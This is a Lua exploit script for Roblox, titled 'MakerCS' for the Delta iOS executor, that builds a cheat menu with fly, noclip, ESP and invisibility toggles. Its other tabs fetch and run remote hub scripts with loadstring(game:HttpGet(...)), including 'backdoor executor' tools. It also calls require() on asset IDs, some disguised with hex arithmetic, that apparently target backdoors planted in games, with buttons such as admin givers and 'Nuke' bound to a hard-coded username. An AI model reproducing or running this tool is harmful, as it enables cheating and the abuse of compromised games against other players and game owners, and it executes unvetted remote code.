-- MakerCS - Delta iOS with All Scripts
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local SG = game:GetService("StarterGui")

local plr = Players.LocalPlayer
local char, hum, root

-- Your username for server-side scripts
local USERNAME = "ThatOneScripter1234"

-- Wait for character function
local function getCharacter()
    char = plr.Character or plr.CharacterAdded:Wait()
    hum = char:WaitForChild("Humanoid")
    root = char:WaitForChild("HumanoidRootPart")
    return true
end

getCharacter()

local flying, noclipping, espOn, discoOn, invisible = false, false, false, false, false
local flySpeed = 50
local cons = {}
local esps = {}

-- Check if game is backdoored
local function isGameBackdoored()
    local success, result = pcall(function()
        return require(7192763922)
    end)
    return success
end

plr.CharacterAdded:Connect(function(newChar)
    char = newChar
    hum = char:WaitForChild("Humanoid")
    root = char:WaitForChild("HumanoidRootPart")
    
    if noclipping then
        task.wait(0.5)
        for _,part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
    
    if invisible then
        task.wait(0.5)
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") or part:IsA("MeshPart") then
                part.Transparency = 1
            end
        end
    end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "MakerCS"
gui.ResetOnSpawn = false
gui.Parent = plr:WaitForChild("PlayerGui")

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 350, 0, 600)
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -300)
mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = gui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,50)
title.BackgroundColor3 = Color3.fromRGB(0,100,200)
title.Text = "MakerCS [Delta iOS]"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 10)

-- Username display
local userLabel = Instance.new("TextLabel")
userLabel.Size = UDim2.new(1,0,0,25)
userLabel.Position = UDim2.new(0,0,0,50)
userLabel.BackgroundColor3 = Color3.fromRGB(0,70,140)
userLabel.Text = "User: " .. USERNAME
userLabel.TextColor3 = Color3.new(1,1,0.5)
userLabel.TextScaled = true
userLabel.Font = Enum.Font.GothamBold
userLabel.Parent = mainFrame

-- Tabs
local tabFrame = Instance.new("Frame")
tabFrame.Size = UDim2.new(1,0,0,40)
tabFrame.Position = UDim2.new(0,0,0,75)
tabFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
tabFrame.Parent = mainFrame
Instance.new("UICorner", tabFrame)

local mainTabBtn = Instance.new("TextButton")
mainTabBtn.Size = UDim2.new(0.33,0,1,0)
mainTabBtn.Position = UDim2.new(0,0,0,0)
mainTabBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
mainTabBtn.Text = "Main"
mainTabBtn.TextColor3 = Color3.new(1,1,1)
mainTabBtn.TextScaled = true
mainTabBtn.Font = Enum.Font.GothamBold
mainTabBtn.Parent = tabFrame
Instance.new("UICorner", mainTabBtn)

local scriptsTabBtn = Instance.new("TextButton")
scriptsTabBtn.Size = UDim2.new(0.33,0,1,0)
scriptsTabBtn.Position = UDim2.new(0.33,0,0,0)
scriptsTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
scriptsTabBtn.Text = "Scripts"
scriptsTabBtn.TextColor3 = Color3.new(1,1,1)
scriptsTabBtn.TextScaled = true
scriptsTabBtn.Font = Enum.Font.GothamBold
scriptsTabBtn.Parent = tabFrame
Instance.new("UICorner", scriptsTabBtn)

local ssTabBtn = Instance.new("TextButton")
ssTabBtn.Size = UDim2.new(0.34,0,1,0)
ssTabBtn.Position = UDim2.new(0.66,0,0,0)
ssTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
ssTabBtn.Text = "ServerSide"
ssTabBtn.TextColor3 = Color3.new(1,1,1)
ssTabBtn.TextScaled = true
ssTabBtn.Font = Enum.Font.GothamBold
ssTabBtn.Parent = tabFrame
Instance.new("UICorner", ssTabBtn)

-- Minimize Button
local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0,35,0,35)
minBtn.Position = UDim2.new(1,-40,0,8)
minBtn.BackgroundColor3 = Color3.fromRGB(180,40,40)
minBtn.Text = "✕"
minBtn.TextColor3 = Color3.new(1,1,1)
minBtn.TextScaled = true
minBtn.Parent = mainFrame
Instance.new("UICorner", minBtn)

-- Floating Icon
local icon = Instance.new("TextButton")
icon.Size = UDim2.new(0,70,0,70)
icon.Position = UDim2.new(0.5,-35,0.2,0)
icon.BackgroundColor3 = Color3.fromRGB(0,100,200)
icon.Text = "⚙️\nMakerCS"
icon.TextColor3 = Color3.new(1,1,1)
icon.TextScaled = true
icon.Visible = false
icon.Draggable = true
icon.Parent = gui
Instance.new("UICorner", icon).CornerRadius = UDim.new(0, 20)

-- Content Frames
local mainContent = Instance.new("ScrollingFrame")
mainContent.Size = UDim2.new(1,0,1,-130)
mainContent.Position = UDim2.new(0,0,0,100)
mainContent.BackgroundTransparency = 1
mainContent.CanvasSize = UDim2.new(0,0,0,0)
mainContent.ScrollBarThickness = 8
mainContent.Parent = mainFrame

local scriptsContent = Instance.new("ScrollingFrame")
scriptsContent.Size = UDim2.new(1,0,1,-130)
scriptsContent.Position = UDim2.new(0,0,0,100)
scriptsContent.BackgroundTransparency = 1
scriptsContent.Visible = false
scriptsContent.CanvasSize = UDim2.new(0,0,0,0)
scriptsContent.ScrollBarThickness = 8
scriptsContent.Parent = mainFrame

local ssContent = Instance.new("ScrollingFrame")
ssContent.Size = UDim2.new(1,0,1,-130)
ssContent.Position = UDim2.new(0,0,0,100)
ssContent.BackgroundTransparency = 1
ssContent.Visible = false
ssContent.CanvasSize = UDim2.new(0,0,0,0)
ssContent.ScrollBarThickness = 8
ssContent.Parent = mainFrame

-- UIListLayout for each content frame
local mainLayout = Instance.new("UIListLayout")
mainLayout.Parent = mainContent
mainLayout.Padding = UDim.new(0, 10)
mainLayout.SortOrder = Enum.SortOrder.LayoutOrder

local scriptsLayout = Instance.new("UIListLayout")
scriptsLayout.Parent = scriptsContent
scriptsLayout.Padding = UDim.new(0, 10)
scriptsLayout.SortOrder = Enum.SortOrder.LayoutOrder

local ssLayout = Instance.new("UIListLayout")
ssLayout.Parent = ssContent
ssLayout.Padding = UDim.new(0, 10)
ssLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function notify(txt)
    pcall(function()
        SG:SetCore("SendNotification", {Title="MakerCS", Text=txt, Duration=3})
    end)
end

local function makeButton(parent, text, toggleFunc, state)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9,0,0,50)
    btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
    btn.Text = text
    btn.TextColor3 = Color3.new(1,1,1)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamSemibold
    btn.Parent = parent
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)

    btn.MouseButton1Click:Connect(function()
        if toggleFunc then
            toggleFunc()
            if state then
                btn.BackgroundColor3 = state[1] and Color3.fromRGB(0,170,0) or Color3.fromRGB(40,40,40)
            end
        end
    end)
    return btn
end

local function makeScriptButton(parent, text, url, order)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9,0,0,50)
    btn.BackgroundColor3 = Color3.fromRGB(50,50,70)
    btn.Text = text
    btn.TextColor3 = Color3.new(1,1,1)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamSemibold
    btn.LayoutOrder = order
    btn.Parent = parent
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)

    btn.MouseButton1Click:Connect(function()
        notify("Loading " .. text .. "...")
        pcall(function()
            loadstring(game:HttpGet(url))()
        end)
        notify(text .. " Loaded!")
    end)
    return btn
end

-- === MAIN TAB FEATURES ===
local function toggleFly()
    if not root then 
        notify("Wait for character to load!")
        return 
    end
    flying = not flying
    if flying then
        local bv = Instance.new("BodyVelocity")
        local bg = Instance.new("BodyGyro")
        bv.MaxForce = Vector3.new(9e9,9e9,9e9)
        bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
        bv.Parent = root
        bg.Parent = root
        
        local con = RS.RenderStepped:Connect(function()
            if not flying or not root or not root.Parent then 
                if bv then bv.Velocity = Vector3.new() end
                return 
            end
            local cam = workspace.CurrentCamera
            local dir = Vector3.new()
            if UIS:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
            if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir + Vector3.new(0, -1, 0) end
            if dir.Magnitude > 0 then
                bv.Velocity = dir.Unit * flySpeed
            else
                bv.Velocity = Vector3.new()
            end
            bg.CFrame = cam.CFrame
        end)
        table.insert(cons, con)
        notify("Fly Enabled (WASD + Space/Ctrl)")
    else
        for _,v in pairs(root:GetChildren()) do
            if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then 
                v:Destroy()
            end
        end
        notify("Fly Disabled")
    end
end

local function toggleNoclip()
    noclipping = not noclipping
    notify(noclipping and "Noclip Enabled" or "Noclip Disabled")
end

local noclipCon = RS.Stepped:Connect(function()
    if noclipping and char then
        for _,part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
end)
table.insert(cons, noclipCon)

local function toggleESP()
    espOn = not espOn
    if espOn then
        for _,p in pairs(Players:GetPlayers()) do
            if p ~= plr and p.Character and p.Character:FindFirstChild("Head") then
                local bg = Instance.new("BillboardGui")
                bg.Adornee = p.Character.Head
                bg.Size = UDim2.new(4,0,2,0)
                bg.AlwaysOnTop = true
                bg.Parent = gui
                local tl = Instance.new("TextLabel")
                tl.Size = UDim2.new(1,0,1,0)
                tl.BackgroundTransparency = 1
                tl.Text = p.Name
                tl.TextColor3 = Color3.new(1,0,0)
                tl.TextScaled = true
                tl.Parent = bg
                table.insert(esps, bg)
            end
        end
        notify("ESP Enabled")
    else
        for _,v in pairs(esps) do 
            pcall(function() v:Destroy() end)
        end
        esps = {}
        notify("ESP Disabled")
    end
end

local discoCon = nil
local function toggleDisco()
    discoOn = not discoOn
    if discoOn then
        discoCon = RS.Heartbeat:Connect(function()
            if discoOn then
                Lighting.Ambient = Color3.fromHSV(tick()%5/5,1,1)
            end
        end)
        table.insert(cons, discoCon)
        notify("Disco Enabled")
    else
        if discoCon then discoCon:Disconnect() end
        Lighting.Ambient = Color3.fromRGB(127,127,127)
        notify("Disco Disabled")
    end
end

local function toggleInvisible()
    if not char then
        notify("Wait for character to load!")
        return
    end
    invisible = not invisible
    if invisible then
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") or part:IsA("MeshPart") then
                part.Transparency = 1
            end
        end
        notify("Invisibility Enabled")
    else
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") or part:IsA("MeshPart") then
                part.Transparency = 0
            end
        end
        notify("Invisibility Disabled")
    end
end

-- Main tab buttons
local flyBtn = makeButton(mainContent, "Toggle Fly", toggleFly, {flying})
local noclipBtn = makeButton(mainContent, "Toggle Noclip", toggleNoclip, {noclipping})
local espBtn = makeButton(mainContent, "Toggle ESP", toggleESP, {espOn})
local discoBtn = makeButton(mainContent, "Toggle Disco", toggleDisco, {discoOn})
local invisBtn = makeButton(mainContent, "Toggle Invisible", toggleInvisible, {invisible})

flyBtn.LayoutOrder = 1
noclipBtn.LayoutOrder = 2
espBtn.LayoutOrder = 3
discoBtn.LayoutOrder = 4
invisBtn.LayoutOrder = 5

-- === SCRIPTS TAB ===
makeScriptButton(scriptsContent, "Load Infinite Yield", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", 1)
makeScriptButton(scriptsContent, "Load Tiger X V3.5", "https://raw.githubusercontent.com/balintTheDevX/Tiger-X-V3/main/Tiger%20X%20V3.5%20Fixed", 2)
makeScriptButton(scriptsContent, "Load Vertex MM2", "https://raw.smokingscripts.org/vertex.lua", 3)
makeScriptButton(scriptsContent, "Load Pastefy Script", "https://pastefy.app/iPp0a0Nx/raw", 4)
makeScriptButton(scriptsContent, "Load Emotes Script", "https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua", 5)

-- === SERVERSIDE SCRIPTS TAB ===
-- Backdoor Checker button
local checkBtn = Instance.new("TextButton")
checkBtn.Size = UDim2.new(0.9,0,0,50)
checkBtn.BackgroundColor3 = Color3.fromRGB(100,50,50)
checkBtn.Text = "⚠️ Check if Game is Backdoored ⚠️"
checkBtn.TextColor3 = Color3.new(1,1,1)
checkBtn.TextScaled = true
checkBtn.Font = Enum.Font.GothamBold
checkBtn.LayoutOrder = 0
checkBtn.Parent = ssContent
Instance.new("UICorner", checkBtn).CornerRadius = UDim.new(0,8)

checkBtn.MouseButton1Click:Connect(function()
    if isGameBackdoored() then
        notify("✅ This game IS backdoored! Server-side scripts should work!")
        checkBtn.BackgroundColor3 = Color3.fromRGB(0,170,0)
    else
        notify("❌ This game is NOT backdoored! Server-side scripts will NOT work!")
        checkBtn.BackgroundColor3 = Color3.fromRGB(170,0,0)
    end
end)

-- Server-side scripts (DIRECT EXECUTION, not loadstring)
local ssScripts = {
    {"HD Admin Giver", function() pcall(function() require(7192763922).load("ThatOneScripter1234") end) end},
    {"OP GUI Sigma", function() pcall(function() require(0x7435b09c4+0x38501a58+0x5a59*-0xa0396):opss144anz("ThatOneScripter1234") end) end},
    {"OP GUI ES", function() pcall(function() require(7116428237).SBV4("ThatOneScripter1234") end) end},
    {"R6 Archangel of Light", function() pcall(function() require(5813836873).load("ThatOneScripter1234") end) end},
    {"OP GUI Sensation SS", function() pcall(function() require(100263845596551)("ThatOneScripter1234", ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard") end) end},
    {"OP Earthy Hub", function() pcall(function() require(5282751219):Fire("ThatOneScripter1234") end) end},
    {"Nuke", function() pcall(function() require(113113746583514).nuke("ThatOneScripter1234") end) end},
    {"Timed Nuke V2", function() pcall(function() require(4867426485):SD2("ThatOneScripter1234") end) end},
    {"Timed Nuke V1", function() pcall(function() require(4867426485):SD("ThatOneScripter1234") end) end},
    {"LC Tools Reuploaded", function() pcall(function() require(7001260635).lctoolsreuploaded("ThatOneScripter1234") end) end},
    {"Minecraft Building", function() pcall(function() require(15581949972).mc("ThatOneScripter1234") end) end},
    {"Helicopter", function() pcall(function() require(9230060018).RAroblox("ThatOneScripter1234") end) end},
    {"Time Machine", function() pcall(function() require(7411835387)("ThatOneScripter1234") end) end},
    {"You Are An Idiot", function() pcall(function() require(8222129769).youareanidiot("ThatOneScripter1234") end) end},
    {"Drill Destroyer", function() pcall(function() require(11505758587).RAroblox("ThatOneScripter1234") end) end},
    {"Excavator", function() pcall(function() require(16857604287)("ThatOneScripter1234") end) end},
    {"Cybertruck", function() pcall(function() require(114451231828363).TeslaCybertruck("ThatOneScripter1234") end) end},
    {"Team Fat GUI V25", function() pcall(function() require(0x4047FE746).C00PER("ThatOneScripter1234") end) end},
    {"Chicken Script", function() pcall(function() require(16316592650).chickensaretastyandverymuchyummybut12345djsfnsdifjbiBHDFBEFIHEZBFIUESH0("ThatOneScripter1234") end) end},
    {"Dev Console", function() pcall(function() require(6016746796):Console("ThatOneScripter1234") end) end},
    {"Adonis Ranker", function() pcall(function() require(5436326937)("ThatOneScripter1234") end) end}
}

local order = 1
for _, scriptData in pairs(ssScripts) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9,0,0,50)
    btn.BackgroundColor3 = Color3.fromRGB(70,50,50)
    btn.Text = scriptData[1]
    btn.TextColor3 = Color3.new(1,1,1)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamSemibold
    btn.LayoutOrder = order
    btn.Parent = ssContent
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
    
    local func = scriptData[2]
    btn.MouseButton1Click:Connect(function()
        if not isGameBackdoored() then
            notify("⚠️ This game may not be backdoored! This script may not work!")
        end
        notify("Executing: " .. scriptData[1])
        pcall(func)
    end)
    order = order + 1
end

-- Loadstring server-side scripts
local ssLoadstringScripts = {
    {"Sky Hub Backdoor", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/FE/BackDoor/tntmasterss.txt"},
    {"LALOL Hub Backdoor Scanner", "https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"},
    {"Backdoor Executor (Kicks if not backdoored)", "https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"}
}

for _, scriptData in pairs(ssLoadstringScripts) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9,0,0,50)
    btn.BackgroundColor3 = Color3.fromRGB(70,50,70)
    btn.Text = scriptData[1]
    btn.TextColor3 = Color3.new(1,1,1)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamSemibold
    btn.LayoutOrder = order
    btn.Parent = ssContent
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
    
    local url = scriptData[2]
    btn.MouseButton1Click:Connect(function()
        if not isGameBackdoored() then
            notify("⚠️ This game may not be backdoored! This script may not work!")
        end
        notify("Loading: " .. scriptData[1])
        pcall(function()
            loadstring(game:HttpGet(url))()
        end)
    end)
    order = order + 1
end

-- Update canvas sizes
local function updateCanvasSize(frame)
    local count = 0
    for _, child in ipairs(frame:GetChildren()) do
        if child:IsA("TextButton") then
            count = count + 1
        end
    end
    local totalHeight = (count * 60) + 20
    frame.CanvasSize = UDim2.new(0, 0, 0, totalHeight)
end

task.wait(0.1)
updateCanvasSize(mainContent)
updateCanvasSize(scriptsContent)
updateCanvasSize(ssContent)

-- Tab Switching
mainTabBtn.MouseButton1Click:Connect(function()
    mainContent.Visible = true
    scriptsContent.Visible = false
    ssContent.Visible = false
    mainTabBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
    scriptsTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
    ssTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
    updateCanvasSize(mainContent)
end)

scriptsTabBtn.MouseButton1Click:Connect(function()
    mainContent.Visible = false
    scriptsContent.Visible = true
    ssContent.Visible = false
    scriptsTabBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
    mainTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
    ssTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
    updateCanvasSize(scriptsContent)
end)

ssTabBtn.MouseButton1Click:Connect(function()
    mainContent.Visible = false
    scriptsContent.Visible = false
    ssContent.Visible = true
    ssTabBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
    mainTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
    scriptsTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
    updateCanvasSize(ssContent)
end)

-- Minimize / Icon
minBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
    icon.Visible = true
end)

icon.MouseButton1Click:Connect(function()
    mainFrame.Visible = true
    icon.Visible = false
end)

notify("MakerCS Loaded! User: " .. USERNAME)